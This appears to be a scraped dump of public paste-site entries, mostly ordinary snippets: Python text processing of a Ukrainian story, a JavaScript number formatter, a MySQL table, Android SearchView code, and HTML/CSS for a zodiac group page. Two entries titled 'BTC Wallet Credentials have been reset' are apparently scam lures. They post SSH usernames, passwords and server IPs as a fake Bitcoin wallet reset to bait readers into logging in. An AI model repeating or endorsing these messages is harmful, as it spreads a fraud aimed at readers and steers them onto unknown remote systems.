id,title,username,language,date,content
UShiaFxW,data748,TestGuy1,JSON,Friday 10th of November 2023 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'afeeb251ee59917bbb3042de0f498adeb8ba34d72d566ae54184a13f67f6345f181c8d53b153ac0322a96b85a0741501402673183de6d1d1536ead9e03d63197c44a6feb45b58ab2dc13757d3c8bfbded0691b76482842d6a82954eb8dda47713c6558f363da07956550415718119471b30e26b85ad70d9c37ed125746148cd0',
  otherdata: [
    'a820ecf7a82b67f13f02b4fb0d8a6bdd',
    '2a645483fb14ad14c6e41108b82af007',
    'dbb70e158df646677da58d32ee8b8ebe',
    'c097f908b212baad15df3fe06d20b75f',
    'e2624fa95d33c014fab7985544a2c26c',
    '6f84cf5b2452cd159512a603c0c07c43',
    '8d2f05eda1551015375bfffaf407db85',
    'bc60a12f3ef37afbca41e1341174783b'
  ]
}"
9rBq0vhu,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Friday 10th of November 2023 05:52:54 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be: 
josli45:KoE3dG1 on 159.223.212.34
You can connect via SSH.

Regards
BT525386"
LT0XRjbA,Untitled,shepeliev,Python,Friday 10th of November 2023 05:49:48 AM CDT,"characters_to_replace = ['_', ',', '.', 'Б', 'З', 'И', 'К', 'У', 'Р', 'Л', 'Е', 'Н', 'Ц', 'Ж']

string = """"""""Це був чистий розбишака-халамидник.
Не було того дня, щоб хто-небудь не жалівся на Федька:
там шибку з рогатки вибив; там синяка підбив своєму ""закадишному"" другові; там перекинув діжку з дощовою водою, яку збирали з таким клопотом.
Наче біс який сидів у хлопцеві! Усі діти як діти,— граються, бавляться тихо, лагідно. Федькові ж, неодмінно, щоб битися, щоб що-небудь перевернути догори ногами. Спокій був його ворогом, з яким він боровся на кожному місці.
Наприклад, таке. Ліплять хатки з піску. Перед будинком, де жив Федько, була незабрукована вулиця і там завжди грузли в піску коні. Після дощу цей пісок ставав липким і вогким,— для будування хаток нема краще. Поставиш ногу, обкладеш її піском і виймай потихеньку. От і хатка. Хто хоче, може навіть димаря приробити. Коло хати можна тин виліпити, а за тином натикати сінинок — і сад є.
А між хатками іде вулиця. Можна в гості ходити одне до одного.
Федько теж ліпить. Але раптом встане, подивиться-подивиться і візьме та й повалить усе чисто — і своє, і чуже. Ще й регочеться.
А як хто розсердиться або заплаче, так і штовхана дасть. Битись з ним і не пробуй,— перший по силі на всю вулицю. Враз тобі дасть підніжку, зімне, насяде і пита:
— Ну? Наживсь на світі? Говори!
Як той каже, що наживсь, то милує; а як пручається — іще б'є.
Або пускають хлопці змія.
Плац великий,— ні будинків, ні магазинів, розбігтись є де. І вітер там раз у раз найкращий.
От заносять змія.
Федько сидить у себе на воротях, як Соловей-Розбійник на дереві, і дивиться. Він усе любить або по кришах лазити, або на воротях сидіти. Ворота високі і там ніби скринька така зроблена. В тій скриньці й засіда Федько.
""""""

for character in characters_to_replace:
    string = string.replace(character, '').replace(character.lower(), '')


print(string)
"
mJ9hKwJL,mony format,Savelyev_Vyacheslav,JavaScript,Friday 10th of November 2023 05:23:52 AM CDT,"  _formatNumber(input1, formatType = 3) {
      // console.log(formatNumber(300000000.222, 1)); // ""300 000 000""
      // console.log(formatNumber('300000000.222', 2)); // ""300 000 000.22""
      // console.log(formatNumber(300000000.56789, 3)); // ""300 000 000,57""
      // console.log(formatNumber('300000000.56789', 4)); // ""300000000.57""
      // console.log(formatNumber('300000000.56789', 5)); // ""300000000""
      // Преобразование входного значения в число
      const number = typeof input1 === 'number' ? input1 : parseFloat(input1);
  
      // Проверка, является ли преобразованное значение числом
      if (isNaN(number)) {
          return 'Неверный ввод';
      }

      switch (formatType) {
          case 1:
              // Формат с разделителями групп без десятичных знаков
              return number.toLocaleString('ru-RU', { maximumFractionDigits: 0 });
          case 2:
              // Формат с разделителями групп и двумя десятичными знаками, но без округления
              return number.toLocaleString('ru-RU', { maximumFractionDigits: 2, minimumFractionDigits: 2 });
          case 3:
              // Формат с разделителями групп и запятой в качестве десятичного разделителя, округление до двух десятичных знаков
              return number.toLocaleString('ru-RU', { maximumFractionDigits: 2 });
          case 4:
              // Формат без разделителей групп и с точкой в качестве десятичного разделителя, округление до двух десятичных знаков
              return number.toFixed(2);
          case 5:
              // Формат без разделителей групп и без точки
              return number.toFixed(0);
          default:
              // Формат с разделителями групп и запятой в качестве десятичного разделителя, округление до двух десятичных знаков
              return number.toLocaleString('ru-RU', { maximumFractionDigits: 2 });
      }
  }

}"
zqqcjQeF,redirection cache,jaideep06,MySQL,Friday 10th of November 2023 05:16:19 AM CDT,"CREATE TABLE `rm_rank_math_redirections_cache` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `from_url` text CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL,
  `redirection_id` bigint(20) unsigned NOT NULL,
  `object_id` bigint(20) unsigned NOT NULL DEFAULT 0,
  `object_type` varchar(10) NOT NULL DEFAULT 'post',
  `is_redirected` tinyint(1) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`),
  KEY `redirection_id` (`redirection_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;"
YtRZ2Ckz,BTC Wallet Credentials have been reset,castlclass_20,GetText,Friday 10th of November 2023 05:10:05 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials will be 
hkuhiso0809lx:VLphK5 on 212.224.93.130
You can connect via SSH.
Regards"
AbvT1ahU,Untitled,vatman,Python,Friday 10th of November 2023 04:45:04 AM CDT,"# Псевдокод для эволюционного алгоритма
def evolutionary_optimization(vectors, calculate_energy, num_generations=1000, population_size=100):
    # Инициализируем популяцию случайными векторами
    population = [random.choice(vectors) for _ in range(population_size)]
    
    for _ in range(num_generations):
        # Вычисляем энергию для каждого вектора в популяции
        energies = [calculate_energy(vector) for vector in population]
        
        # Выбираем лучшие векторы для следующего поколения
        population = select_best_vectors(population, energies)
        
        # Применяем операции мутации и кроссовера для создания нового поколения
        population = mutate_and_crossover(population)
    
    # Возвращаем вектор с наименьшей энергией
    return min(population, key=calculate_energy)
"
SJNFDrzU,constelación / html,maryskins,HTML,Friday 10th of November 2023 04:23:11 AM CDT,"<script src=""//pull.cappuccicons.com/cpf.js""></script>
<div id=""constelacion"">
<div id=""conshead"">
<b>Grupos</b>
<span>Texto sobre los grupos. Tamaño infinito, aumenta según el contenido.</span>
</div>
  
<div class=""cscontent"">
<input type=""radio"" name=""cstab"" id=""cstemas1"" checked/>
<input type=""radio"" name=""cstab"" id=""cstemas2""/>
<input type=""radio"" name=""cstab"" id=""cstemas3""/>
<input type=""radio"" name=""cstab"" id=""cstemas4""/>
<input type=""radio"" name=""cstab"" id=""cstemas5""/>
<input type=""radio"" name=""cstab"" id=""cstemas6""/>
<input type=""radio"" name=""cstab"" id=""cstemas7""/>
<input type=""radio"" name=""cstab"" id=""cstemas8""/>
<input type=""radio"" name=""cstab"" id=""cstemas9""/>
<input type=""radio"" name=""cstab"" id=""cstemas10""/>
<input type=""radio"" name=""cstab"" id=""cstemas11""/>
<input type=""radio"" name=""cstab"" id=""cstemas12""/>
<label for=""cstemas1"" style=""--grupodet:var(--grupo1)"">
<i class=""cp cp-z-aries""></i> GRUPO 1
</label>

<label for=""cstemas2"" style=""--grupodet:var(--grupo2)""><i class=""cp cp-z-taurus""></i> GRUPO 2</label>

<label for=""cstemas3"" style=""--grupodet:var(--grupo3)""><i class=""cp cp-z-gemini""></i> GRUPO 3</label>

<label for=""cstemas4"" style=""--grupodet:var(--grupo4)""><i class=""cp cp-z-cancer""></i> GRUPO 4</label>

<label for=""cstemas5"" style=""--grupodet:var(--grupo5)""><i class=""cp cp-z-leo""></i> GRUPO 5</label>

<label for=""cstemas6"" style=""--grupodet:var(--grupo6)""><i class=""cp cp-z-virgo""></i> GRUPO 6</label>

<label for=""cstemas7"" style=""--grupodet:var(--grupo7)""><i class=""cp cp-z-libra""></i> GRUPO 7</label>

<label for=""cstemas8"" style=""--grupodet:var(--grupo8)""><i class=""cp cp-z-scorpio""></i> GRUPO 8</label>

<label for=""cstemas9"" style=""--grupodet:var(--grupo9)""><i class=""cp cp-z-sagittarius""></i> GRUPO 9</label>

<label for=""cstemas10"" style=""--grupodet:var(--grupo10)""><i class=""cp cp-z-capricorn""></i> GRUPO 10</label>

<label for=""cstemas11"" style=""--grupodet:var(--grupo11)""><i class=""cp cp-z-aquarius""></i> GRUPO 11</label>

<label for=""cstemas12"" style=""--grupodet:var(--grupo12);border-right:1px solid transparent;""><i class=""cp cp-z-pisces""></i> GRUPO 12</label>
  
<div class=""boxcs boxcs1"" style=""--grupodet:var(--grupo1)"">
<img src=""https://via.placeholder.com/400X300"">
<div class=""csinfo"">
  <b>Nombre del grupo</b>
  <em>Subtítulo sobre el grupo</em>
  <span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in quam magna. Proin interdum purus ac odio ornare, et varius sem porttitor. Donec et sodales purus. Aenean sed posuere sapien. Quisque ac mauris et neque ultrices fringilla. Etiam malesuada elit nibh, quis maximus augue finibus eu. Duis hendrerit semper sodales. Fusce maximus consequat pulvinar. Cras non felis mi. Phasellus vitae neque non nulla tempus pellentesque.</span>
</div>
<i class=""cp cp-z-aries""></i>

<div class=""csdatos"">
  <li>Dato 1</li>
  <li>Dato 2</li>
  <li>Dato 3</li>
  <li>Dato 4</li>
</div>
</div>
  
<div class=""boxcs boxcs2"" style=""--grupodet:var(--grupo2)"">
<img src=""https://via.placeholder.com/400X300"">
<div class=""csinfo"">
  <b>Nombre del grupo</b>
  <em>Subtítulo sobre el grupo</em>
  <span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in quam magna. Proin interdum purus ac odio ornare, et varius sem porttitor. Donec et sodales purus. Aenean sed posuere sapien. Quisque ac mauris et neque ultrices fringilla. Etiam malesuada elit nibh, quis maximus augue finibus eu. Duis hendrerit semper sodales. Fusce maximus consequat pulvinar. Cras non felis mi. Phasellus vitae neque non nulla tempus pellentesque.</span>
</div>
<i class=""cp cp-z-aries""></i>

<div class=""csdatos"">
  <li>Dato 1</li>
  <li>Dato 2</li>
  <li>Dato 3</li>
  <li>Dato 4</li>
</div></div>

<div class=""boxcs boxcs3"" style=""--grupodet:var(--grupo3)"">
<img src=""https://via.placeholder.com/400X300"">
<div class=""csinfo"">
  <b>Nombre del grupo</b>
  <em>Subtítulo sobre el grupo</em>
  <span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in quam magna. Proin interdum purus ac odio ornare, et varius sem porttitor. Donec et sodales purus. Aenean sed posuere sapien. Quisque ac mauris et neque ultrices fringilla. Etiam malesuada elit nibh, quis maximus augue finibus eu. Duis hendrerit semper sodales. Fusce maximus consequat pulvinar. Cras non felis mi. Phasellus vitae neque non nulla tempus pellentesque.</span>
</div>
<i class=""cp cp-z-gemini""></i>

<div class=""csdatos"">
  <li>Dato 1</li>
  <li>Dato 2</li>
  <li>Dato 3</li>
  <li>Dato 4</li>
</div></div>

<div class=""boxcs boxcs4"" style=""--grupodet:var(--grupo4)"">
<img src=""https://via.placeholder.com/400X300"">
<div class=""csinfo"">
  <b>Nombre del grupo</b>
  <em>Subtítulo sobre el grupo</em>
  <span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in quam magna. Proin interdum purus ac odio ornare, et varius sem porttitor. Donec et sodales purus. Aenean sed posuere sapien. Quisque ac mauris et neque ultrices fringilla. Etiam malesuada elit nibh, quis maximus augue finibus eu. Duis hendrerit semper sodales. Fusce maximus consequat pulvinar. Cras non felis mi. Phasellus vitae neque non nulla tempus pellentesque.</span>
</div>
<i class=""cp cp-z-cancer""></i>

<div class=""csdatos"">
  <li>Dato 1</li>
  <li>Dato 2</li>
  <li>Dato 3</li>
  <li>Dato 4</li>
</div></div>
  
<div class=""boxcs boxcs5"" style=""--grupodet:var(--grupo5)"">
<img src=""https://via.placeholder.com/400X300"">
<div class=""csinfo"">
  <b>Nombre del grupo</b>
  <em>Subtítulo sobre el grupo</em>
  <span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in quam magna. Proin interdum purus ac odio ornare, et varius sem porttitor. Donec et sodales purus. Aenean sed posuere sapien. Quisque ac mauris et neque ultrices fringilla. Etiam malesuada elit nibh, quis maximus augue finibus eu. Duis hendrerit semper sodales. Fusce maximus consequat pulvinar. Cras non felis mi. Phasellus vitae neque non nulla tempus pellentesque.</span>
</div>
<i class=""cp cp-z-leo""></i>

<div class=""csdatos"">
  <li>Dato 1</li>
  <li>Dato 2</li>
  <li>Dato 3</li>
  <li>Dato 4</li>
</div></div>

<div class=""boxcs boxcs6"" style=""--grupodet:var(--grupo6)"">
<img src=""https://via.placeholder.com/400X300"">
<div class=""csinfo"">
  <b>Nombre del grupo</b>
  <em>Subtítulo sobre el grupo</em>
  <span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in quam magna. Proin interdum purus ac odio ornare, et varius sem porttitor. Donec et sodales purus. Aenean sed posuere sapien. Quisque ac mauris et neque ultrices fringilla. Etiam malesuada elit nibh, quis maximus augue finibus eu. Duis hendrerit semper sodales. Fusce maximus consequat pulvinar. Cras non felis mi. Phasellus vitae neque non nulla tempus pellentesque.</span>
</div>
<i class=""cp cp-z-virgo""></i>

<div class=""csdatos"">
  <li>Dato 1</li>
  <li>Dato 2</li>
  <li>Dato 3</li>
  <li>Dato 4</li>
</div></div>

<div class=""boxcs boxcs7"" style=""--grupodet:var(--grupo7)"">
<img src=""https://via.placeholder.com/400X300"">
<div class=""csinfo"">
  <b>Nombre del grupo</b>
  <em>Subtítulo sobre el grupo</em>
  <span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in quam magna. Proin interdum purus ac odio ornare, et varius sem porttitor. Donec et sodales purus. Aenean sed posuere sapien. Quisque ac mauris et neque ultrices fringilla. Etiam malesuada elit nibh, quis maximus augue finibus eu. Duis hendrerit semper sodales. Fusce maximus consequat pulvinar. Cras non felis mi. Phasellus vitae neque non nulla tempus pellentesque.</span>
</div>
<i class=""cp cp-z-libra""></i>

<div class=""csdatos"">
  <li>Dato 1</li>
  <li>Dato 2</li>
  <li>Dato 3</li>
  <li>Dato 4</li>
</div></div>
  
<div class=""boxcs boxcs8"" style=""--grupodet:var(--grupo8)"">
<img src=""https://via.placeholder.com/400X300"">
<div class=""csinfo"">
  <b>Nombre del grupo</b>
  <em>Subtítulo sobre el grupo</em>
  <span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in quam magna. Proin interdum purus ac odio ornare, et varius sem porttitor. Donec et sodales purus. Aenean sed posuere sapien. Quisque ac mauris et neque ultrices fringilla. Etiam malesuada elit nibh, quis maximus augue finibus eu. Duis hendrerit semper sodales. Fusce maximus consequat pulvinar. Cras non felis mi. Phasellus vitae neque non nulla tempus pellentesque.</span>
</div>
<i class=""cp cp-z-scorpio""></i>

<div class=""csdatos"">
  <li>Dato 1</li>
  <li>Dato 2</li>
  <li>Dato 3</li>
  <li>Dato 4</li>
</div></div>

<div class=""boxcs boxcs9"" style=""--grupodet:var(--grupo9)"">
<img src=""https://via.placeholder.com/400X300"">
<div class=""csinfo"">
  <b>Nombre del grupo</b>
  <em>Subtítulo sobre el grupo</em>
  <span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in quam magna. Proin interdum purus ac odio ornare, et varius sem porttitor. Donec et sodales purus. Aenean sed posuere sapien. Quisque ac mauris et neque ultrices fringilla. Etiam malesuada elit nibh, quis maximus augue finibus eu. Duis hendrerit semper sodales. Fusce maximus consequat pulvinar. Cras non felis mi. Phasellus vitae neque non nulla tempus pellentesque.</span>
</div>
<i class=""cp cp-z-sagittarius""></i>

<div class=""csdatos"">
  <li>Dato 1</li>
  <li>Dato 2</li>
  <li>Dato 3</li>
  <li>Dato 4</li>
</div></div>

<div class=""boxcs boxcs10"" style=""--grupodet:var(--grupo10)"">
<img src=""https://via.placeholder.com/400X300"">
<div class=""csinfo"">
  <b>Nombre del grupo</b>
  <em>Subtítulo sobre el grupo</em>
  <span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in quam magna. Proin interdum purus ac odio ornare, et varius sem porttitor. Donec et sodales purus. Aenean sed posuere sapien. Quisque ac mauris et neque ultrices fringilla. Etiam malesuada elit nibh, quis maximus augue finibus eu. Duis hendrerit semper sodales. Fusce maximus consequat pulvinar. Cras non felis mi. Phasellus vitae neque non nulla tempus pellentesque.</span>
</div>
<i class=""cp cp-z-capricorn""></i>

<div class=""csdatos"">
  <li>Dato 1</li>
  <li>Dato 2</li>
  <li>Dato 3</li>
  <li>Dato 4</li>
</div></div>
  
<div class=""boxcs boxcs11"" style=""--grupodet:var(--grupo11)"">
<img src=""https://via.placeholder.com/400X300"">
<div class=""csinfo"">
  <b>Nombre del grupo</b>
  <em>Subtítulo sobre el grupo</em>
  <span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in quam magna. Proin interdum purus ac odio ornare, et varius sem porttitor. Donec et sodales purus. Aenean sed posuere sapien. Quisque ac mauris et neque ultrices fringilla. Etiam malesuada elit nibh, quis maximus augue finibus eu. Duis hendrerit semper sodales. Fusce maximus consequat pulvinar. Cras non felis mi. Phasellus vitae neque non nulla tempus pellentesque.</span>
</div>
<i class=""cp cp-z-aquarius""></i>

<div class=""csdatos"">
  <li>Dato 1</li>
  <li>Dato 2</li>
  <li>Dato 3</li>
  <li>Dato 4</li>
</div></div>

<div class=""boxcs boxcs12"" style=""--grupodet:var(--grupo12)"">
<img src=""https://via.placeholder.com/400X300"">
<div class=""csinfo"">
  <b>Nombre del grupo</b>
  <em>Subtítulo sobre el grupo</em>
  <span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in quam magna. Proin interdum purus ac odio ornare, et varius sem porttitor. Donec et sodales purus. Aenean sed posuere sapien. Quisque ac mauris et neque ultrices fringilla. Etiam malesuada elit nibh, quis maximus augue finibus eu. Duis hendrerit semper sodales. Fusce maximus consequat pulvinar. Cras non felis mi. Phasellus vitae neque non nulla tempus pellentesque.</span>
</div>
<i class=""cp cp-z-pisces""></i>

<div class=""csdatos"">
  <li>Dato 1</li>
  <li>Dato 2</li>
  <li>Dato 3</li>
  <li>Dato 4</li>
</div></div>

</div></div>"
Jk46F1DE,SearchView in Toolbar in a Fragment,chayanforyou,Java,Friday 10th of November 2023 04:21:22 AM CDT,"private MenuItem menuSearch;
private SearchView searchView;

//..............

binding.toolbar.inflateMenu(R.menu.menu);
menuSearch = binding.toolbar.getMenu().findItem(R.id.action_search);
searchView = (SearchView) menuSearch.getActionView();
initSearchView();
customizeSearchView();

binding.toolbar.setOnMenuItemClickListener(item -> {
    int itemId = item.getItemId();
    if (itemId == R.id.action_filter) {
        View anchor = view.findViewById(R.id.action_filter);
        filterImage(anchor);
        return true;
    }
    return false;
});

//..............

private final OnBackPressedCallback onBackPressedCallback = new OnBackPressedCallback(true) {
    @Override
    public void handleOnBackPressed() {
        if (!searchView.isIconified()) {
            menuSearch.collapseActionView();
        } else {
            setEnabled(false);
            requireActivity().getOnBackPressedDispatcher().onBackPressed();
        }
    }
};

//..............

private void initSearchView() {
    menuSearch.setOnActionExpandListener(new MenuItem.OnActionExpandListener() {
        @Override
        public boolean onMenuItemActionExpand(@NonNull MenuItem item) {
            return true;
        }

        @Override
        public boolean onMenuItemActionCollapse(@NonNull MenuItem item) {
            return true;
        }
    });

    searchView.setOnQueryTextListener(new SearchView.OnQueryTextListener() {
        @Override
        public boolean onQueryTextSubmit(String query) {
            return false;
        }

        @Override
        public boolean onQueryTextChange(String query) {
            return true;
        }
    });
}

@SuppressLint(""DiscouragedPrivateApi"")
private void customizeSearchView() {
    SearchManager searchManager = (SearchManager) requireActivity().getSystemService(Context.SEARCH_SERVICE);
    if (searchManager != null) {
        searchView.setSearchableInfo(searchManager.getSearchableInfo(requireActivity().getComponentName()));
    }

    SearchView.SearchAutoComplete searchAutoComplete =
            searchView.findViewById(androidx.appcompat.R.id.search_src_text);
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
        searchAutoComplete.setTextCursorDrawable(R.drawable.my_cursor);
    } else {
        try {
            Field field = TextView.class.getDeclaredField(""mCursorDrawableRes"");
            field.setAccessible(true);
            field.set(searchAutoComplete, R.drawable.my_cursor);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}"
zhZtteBx,constelación / css,maryskins,CSS,Friday 10th of November 2023 04:16:46 AM CDT,"/* PAGINA DE GRUPOS CONSTELACION X MARY */

/*VARIABLES*/
#constelacion{
  --fondocs:#121212;
  --bordecs:#2F2F2F;
  --acentocs:#FDEAAE;
    
  --grupo1:#5C99B2;
  --grupo2:#f62062;
  --grupo3:#c4720d;
  --grupo4:#a2cc5d;
  --grupo5:#5b6dee;
  --grupo6:#633f44;
  --grupo7:#b82a0f;
  --grupo8:#b981e3;
  --grupo9:#3472cf;
  --grupo10:#27a769;
  --grupo11:#f4ceda;
  --grupo12:#a72f0c;
    
  --colortxt:#EFEFEF;
  --colorsubtxt:#767676;
  
  --familytxt:'Poppins';
  --familyheadtxt:'DM Serif Display';
    
  --sizetxt:12px;
}

/*CSS*/
#constelacion{
  font-family:var(--familytxt);
  width:100%; /*ANCHO TOTAL*/
  height:700px; /*ALTURA TOTAL*/
  border:1px solid var(--bordecs);
background:var(--fondocs);
  margin:auto;
  font-size:var(--sizetxt);
  color:var(--colortxt);
  overflow:hidden;
}

#constelacion #conshead {
  border-bottom: 1px solid var(--bordecs);
  padding: 4%;
  display: flex;
  flex-direction: column;
  position:relative;
}

#constelacion #conshead b{
  font-size:3.5em;
  color:var(--acentocs);
  font-family:var(--familyheadtxt);
  z-index:2;
}

#constelacion #conshead span{
  padding:0px;
  margin:5px 0px;
  width:67%;
  z-index:2;
  text-align:justify;
}

#constelacion #conshead::before {
content: "" "";
  z-index: 1;
  width: 55px;
  height: 300px;
  display: block;
  position: absolute;
  border-radius: 100%;
  border: 2px solid var(--bordecs);
  top: -38px;
  left: 129px;
  transform: rotate(297deg);
}

.cscontent {
  height: 400px;
  width: 100%;
  position: relative;
  display: flex;
  flex-direction: row;
  flex-wrap: nowrap;
  justify-content: center;
  align-content: flex-start;

}

.cscontent .boxcs {
  position: absolute;
  left: -100%;
  transition: ease 1s;
  width: 92%;
  height: 320px;
  display: flex;
  flex-direction: row;
  justify-content: flex-start;
  flex-wrap: wrap;
  overflow: hidden;
  top: 100px;
  border: 1px solid var(--bordecs);
  border-radius: 10px;
  background: var(--fondocs);
  overflow: hidden;
}

.cscontent .boxcs::before {
content: "" "";
background: radial-gradient(circle, var(--grupodet) 0%, var(--fondocs) 60%);
  width:700px;
  height:500px;
  position:absolute;
  border-radius:100%;
  opacity:0.3;
  left:-60px;
  bottom:-90px;
  z-index:1;
}

.cscontent .boxcs img {
  width: 400px;
  height: 300px;
  margin: 10px;
  z-index:3;
  background-position:center;
  background-size:cover;
}

.cscontent .boxcs .csinfo {
  width: 55%;
  display: flex;
  flex-direction: column;
  align-items: flex-end;
  align-content: flex-end;
  justify-content: flex-start;
  margin: 10px;
  z-index:2;
}

.cscontent .boxcs .csinfo b{
  color:var(--grupodet);
  font-family:var(--familyheadtxt);
  font-size:3em;
}

.cscontent .boxcs .csinfo em{
  font-style:normal;
  text-transform:uppercase;
  margin-top:-3px;
  color: var(--colorsubtxt);
}

.cscontent .boxcs .csinfo span{
  padding:2%;
  padding-right:0%;
  margin:0px;
  text-align:justify;
  width:80%;
  overflow:auto;
  display:flex;
}

.cscontent .boxcs i {
  position: absolute;
  right: 0px;
  top: 0px;
  border: 1px solid var(--bordecs);
  width: 50px;
  height: 50px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 2em;
  border-radius: 0px 0px 0px 30px;
  color: var(--grupodet);
}

.cscontent .boxcs .csdatos {
  width: 100%;
  height: 50px;
  position: absolute;
  bottom: 0;
  z-index: 2;
  border-top: 1px solid var(--bordecs);
  display: flex;
  flex-direction: row-reverse;
  align-items: center;
  overflow:hidden;
}

.cscontent .boxcs .csdatos li {
  color: var(--colorsubtxt);
  width: 140px;
  padding: 5px 10px;
  list-style: none;
  border: 1px solid var(--bordecs);
  border-radius: 100px;
  margin-right: 10px;
  display: flex;
  align-items: center;
  justify-content: center;
  background:var(--fondocs);
}

.cscontent input {
  display:none;
}

.cscontent label {
  width: 100%;
  cursor: pointer;
  padding: 0px;
  align-items: center;
  transition: 1s;
  display: inline-flex;
  z-index: 7;
  position: inherit;
  justify-content: center;
  align-content: center;
  flex-direction: row;
  color: var(--colorsubtxt);
  font-weight: 700;
  border-top: 2px solid transparent;
  border-bottom: 1px solid var(--bordecs);
  height: 50px;
  border-right: 1px solid var(--bordecs);
  flex-wrap: nowrap;
  overflow:hidden;
}

.cscontent label i{
  position:absolute;
  font-size:5em;
  bottom:-15px;
  left:-11px;
  opacity:0.2;
}
.cscontent label:hover{
  color:var(--grupodet);
  transition:1s;
}

.cscontent input#cstemas1:checked ~ .boxcs1, .cscontent input#cstemas2:checked ~ .boxcs2, .cscontent input#cstemas3:checked ~ .boxcs3, .cscontent input#cstemas4:checked ~ .boxcs4, .cscontent input#cstemas5:checked ~ .boxcs5, .cscontent input#cstemas6:checked ~ .boxcs6, .cscontent input#cstemas7:checked ~ .boxcs7, .cscontent input#cstemas8:checked ~ .boxcs8, .cscontent input#cstemas9:checked ~ .boxcs9, .cscontent input#cstemas10:checked ~ .boxcs10, .cscontent input#cstemas11:checked ~ .boxcs11, .cscontent input#cstemas12:checked ~ .boxcs12{
  left:4%;
}

.cscontent input#cstemas1:checked ~ label[for=""cstemas1""], .cscontent input#cstemas2:checked ~ label[for=""cstemas2""], .cscontent input#cstemas3:checked ~ label[for=""cstemas3""], .cscontent input#cstemas4:checked ~ label[for=""cstemas4""], .cscontent input#cstemas5:checked ~ label[for=""cstemas5""], .cscontent input#cstemas6:checked ~ label[for=""cstemas6""], .cscontent input#cstemas7:checked ~ label[for=""cstemas7""], .cscontent input#cstemas8:checked ~ label[for=""cstemas8""], .cscontent input#cstemas9:checked ~ label[for=""cstemas9""], .cscontent input#cstemas10:checked ~ label[for=""cstemas10""], .cscontent input#cstemas11:checked ~ label[for=""cstemas11""], .cscontent input#cstemas12:checked ~ label[for=""cstemas12""]{
transition:1s;
  color: var(--grupodet);
}"
